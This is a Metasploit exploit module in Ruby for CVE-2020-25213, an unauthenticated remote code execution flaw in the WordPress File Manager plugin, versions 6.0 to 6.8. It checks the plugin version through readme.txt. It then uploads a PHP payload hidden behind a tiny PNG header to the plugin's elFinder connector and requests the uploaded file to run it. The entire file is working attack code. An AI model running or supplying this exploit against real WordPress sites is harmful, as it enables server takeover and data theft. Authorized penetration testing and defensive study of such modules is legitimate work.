##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'WordPress File Manager 6.0-6.8 Unauthenticated Remote Code Execution',
        'Description'    => %q(
          The File Manager (wp-file-manager) plugin before 6.9 for WordPress allows remote attackers to upload and
          execute arbitrary PHP code because it renames an unsafe example elFinder connector file to have the .php
          extension. This, for example, allows attackers to run the elFinder upload (or mkfile and put) command to write
          PHP code into the wp-content/plugins/wp-file-manager/lib/files/ directory.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'Alex Souza (w4fz5uck5)', # initial discovery and PoC
            'Imran E. Dawoodjee <imran [at] threathounds.com>', # msf module
          ],
        'References'     =>
          [
            [ 'URL', 'https://github.com/w4fz5uck5/wp-file-manager-0day' ],
            [ 'CVE', '2020-25213' ]
          ],
        'Platform'       => ['php'],
        'Privileged'     => false,
        'Arch'           => ARCH_PHP,
        'Targets'        =>
          [
            [ 'WordPress File Manager 6.0-6.8', {} ]
          ],
        'DisclosureDate' => "Sep 9 2020", # disclosure date on NVD, PoC was published on August 26 2020
        'DefaultTarget'  => 0
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The URI to File Manager', '/wp-content/plugins/wp-file-manager'])
      ], self.class
    )
  end

  def check
    begin
      # the readme file contains the version information, so GET that first
      res = send_request_cgi(
        'uri'       => normalize_uri(target_uri.path, 'readme.txt'),
        'method'    => 'GET'
      )

      # handle errors just in case
      fail_with(Failure::Unreachable, "#{peer} - Could not connect") unless res
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP response code: #{res.code}" ) unless res.code == 200

      # the first line after the changelog is the currently installed version
      changelog_info = res.body.split('== Changelog ==')[1].split("\n")[2]
      if /(\d\.\d)/ =~ changelog_info
        version = Gem::Version.new($1)
        print_status("#{peer} - Detected WordPress File Manager version #{version.to_s}")
        # versions above 6.8 are patched and versions below 6.0 are not vulnerable
        unless version < Gem::Version.new('6.0') or version > Gem::Version.new('6.8')
          return Exploit::CheckCode::Vulnerable
        end
      end

      return Exploit::CheckCode::Safe
    end
  end

  #
  # The exploit method attempts a login, then attempts to throw a command execution
  # at a web page through a POST variable
  #
  def exploit
    begin
      unless [CheckCode::Vulnerable].include? check
        fail_with Failure::NotVulnerable, "Target is most likely not vulnerable!"
      end

      # the smallest PNG I found was 51 bytes: https://github.com/mathiasbynens/small/blob/master/png-truncated.png
      smallest_png_possible = "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6300010000050001"
      # prep for exploit, it will create a randomly named .php file under TARGETURI/lib/files/
      boundary = "------------------------#{Rex::Text.rand_text_hex(16)}"
      post_data = "#{boundary}\r\n"
      post_data << "Content-Disposition: form-data; name=\"cmd\"\r\n\r\n"
      post_data << "upload\r\n"
      post_data << "#{boundary}\r\n"
      post_data << "Content-Disposition: form-data; name=\"target\"\r\n\r\n"
      post_data << "l1_Lw\r\n"
      post_data << "#{boundary}\r\n"
      post_data << "Content-Disposition: form-data; name=\"upload[]\"; filename=\"#{Rex::Text.rand_text_alphanumeric(6)}.php\"\r\n"
      post_data << "Content-Type: image/png\r\n\r\n"
      post_data << Array(smallest_png_possible).pack('H*')
      post_data << "#{payload.encode}\r\n"
      post_data << "#{boundary}--\r\n"

      # the boundary in the Content-Type has 2 less hyphens than the others (!)
      # it actually has to be that way to work (!)
      res = send_request_cgi(
        'uri'          => normalize_uri(target_uri.path, 'lib/php/connector.minimal.php'),
        'method'       => 'POST',
        'ctype'        => "multipart/form-data; boundary=#{boundary[2..-1]}",
        'headers'      => {
            'Accept'          => '*/*',
            'Accept-Encoding' => 'gzip, deflate',
            'Connection'      => 'close',
            'Expect'          => '100-continue'
        },
        'data'         => post_data
      )

      fail_with(Failure::Unreachable, "#{peer} - Could not connect") unless res
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP response code: #{res.code}") unless res.code == 200

      # the result body contains the path of the uploaded payload
      result_body = res.get_json_document
      payload_uri = result_body['added'][0]['url'].split("../")[1]
      vprint_status("#{peer} - Payload is at #{normalize_uri(target_uri.path, "lib/#{payload_uri}")}")
      # execute the payload
      send_request_cgi(
        'uri'    => normalize_uri(target_uri.path, "lib/#{payload_uri}"),
        'method' => 'GET'
      )
    end
  end
end
